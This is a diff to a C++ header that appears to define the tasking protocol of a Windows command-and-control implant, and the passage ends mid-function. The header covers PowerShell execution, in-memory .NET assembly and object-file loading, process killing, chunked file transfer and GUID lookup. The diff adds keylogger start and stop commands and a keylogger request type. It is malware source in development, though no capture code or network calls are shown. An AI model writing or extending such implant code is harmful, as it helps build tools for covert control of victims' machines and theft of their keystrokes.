@@ -5,10 +5,13 @@
 #include <cstdint>
 #include <string>
 #include <variant>
+#include <deque>
 
+#include "Command.h"
 #include "rapidjson/stringbuffer.h"
 #include "rapidjson/document.h"
 #include "rapidjson/writer.h"
+#include "Upload.h"
 
 // Task Codes
 #define NO_CODE 0
@@ -20,7 +23,9 @@
 #define RUN_U 6
 #define KILL_PROCESS 7
 #define DOWNLOAD_CHUNK 8
-#define CANCEL_DOWNLOAD 9
+#define START_KEYLOGGER 9
+#define STOP_KEYLOGGER 10
+#define DOWNLOAD_FINAL 11
 
 // Task Types
 #define NOP 0
@@ -36,8 +41,8 @@
 #define NET_ASM 10
 #define OBJECT_FILE 11
 #define GET_UID 12
-#define KEYLOGGER_START 13
-#define KEYLOGGER_STOP 14
+#define WIN_TASK 13
+#define KEYLOGGER 14
 
 // Statuses
 #define NO_FLAG 0
@@ -48,6 +53,9 @@
 #define RUNNING 5
 #define MORE_TO_FOLLOW 6
 #define NO_MORE_TO_FOLLOW 7
+#define COMPLETED 8
+#define DOWNLOAD_CHUNK_STATUS 9
+#define DOWNLOAD_FINAL_STATUS 10
 
 template <typename T>
 struct TaskResponse
@@ -63,7 +71,7 @@ struct TaskResponse
         rapidjson::Document doc;
         doc.SetObject();
 
-        rapidjson::Document::AllocatorType& allocator = doc.GetAllocator();
+        rapidjson::Document::AllocatorType &allocator = doc.GetAllocator();
 
         doc.AddMember("TaskID", taskID, allocator);
         doc.AddMember("TaskType", type, allocator);
@@ -81,7 +89,7 @@ struct TaskResponse
     }
 
     rapidjson::Value ToJsonValue(
-        rapidjson::Document::AllocatorType& allocator) const
+        rapidjson::Document::AllocatorType &allocator) const
     {
         rapidjson::Value objValue;
         objValue.SetObject();
@@ -121,7 +129,7 @@ struct TaskRequest
         rapidjson::Document doc;
         doc.SetObject();
 
-        rapidjson::Document::AllocatorType& allocator = doc.GetAllocator();
+        rapidjson::Document::AllocatorType &allocator = doc.GetAllocator();
 
         doc.AddMember("TaskID", taskID, allocator);
         doc.AddMember("TaskType", type, allocator);
@@ -152,14 +160,14 @@ TaskRequest<T> CreateTaskRequest(
     T data)
 {
     return TaskRequest<T>{taskID, type, code, status, data};
-};
+}
 
 struct TaskSuccess
 {
     std::string output;
 
     rapidjson::Value ToJsonValue(
-        rapidjson::Document::AllocatorType& allocator) const
+        rapidjson::Document::AllocatorType &allocator) const
     {
         rapidjson::Value obj(rapidjson::kObjectType);
 
@@ -182,7 +190,7 @@ struct TaskError
     std::string message;
 
     rapidjson::Value ToJsonValue(
-        rapidjson::Document::AllocatorType& allocator) const
+        rapidjson::Document::AllocatorType &allocator) const
     {
         rapidjson::Value obj(rapidjson::kObjectType);
 
@@ -200,27 +208,35 @@ struct TaskError
         return obj;
     }
 };
-using Request = std::variant<TaskRequest<CommandPowershell>,  TaskRequest<CommandUploadFile>, TaskRequest<CommandWinTask>, TaskRequest<CommandDownloadFile> TaskRequest<CommandNetAsm>, TaskRequest<bool>>;
-using Response = std::variant<TaskResponse<TaskSuccess>, TaskResponse<TaskError>>;
+
+using Request = std::variant<
+    TaskRequest<CommandPowershell>,
+    TaskRequest<CommandWinTask>,
+    TaskRequest<CommandNetAsm>,
+    TaskRequest<CommandKeylogger>,
+    TaskRequest<CommandUploadFile>,
+    TaskRequest<CommandDownloadFile>,
+    TaskRequest<bool>>;
 
 using Response = std::variant<
     TaskResponse<TaskSuccess>,
-    TaskResponse<TaskError>>;
+    TaskResponse<TaskError>,
+    TaskResponse<Upload::Chunk>>;
 
 inline std::string CreateResponseTaskValue(
-    const std::deque<Response>& tasks)
+    const std::deque<Response> &tasks)
 {
     rapidjson::Document jsonDoc;
     jsonDoc.SetArray();
 
-    rapidjson::Document::AllocatorType& allocator =
+    rapidjson::Document::AllocatorType &allocator =
         jsonDoc.GetAllocator();
 
-    for (const auto& taskVariant : tasks)
+    for (const auto &taskVariant : tasks)
     {
         rapidjson::Value taskVal =
             std::visit(
-                [&allocator](const auto& concreteTask) -> rapidjson::Value
+                [&allocator](const auto &concreteTask) -> rapidjson::Value
                 {
                     return concreteTask.ToJsonValue(allocator);
                 },
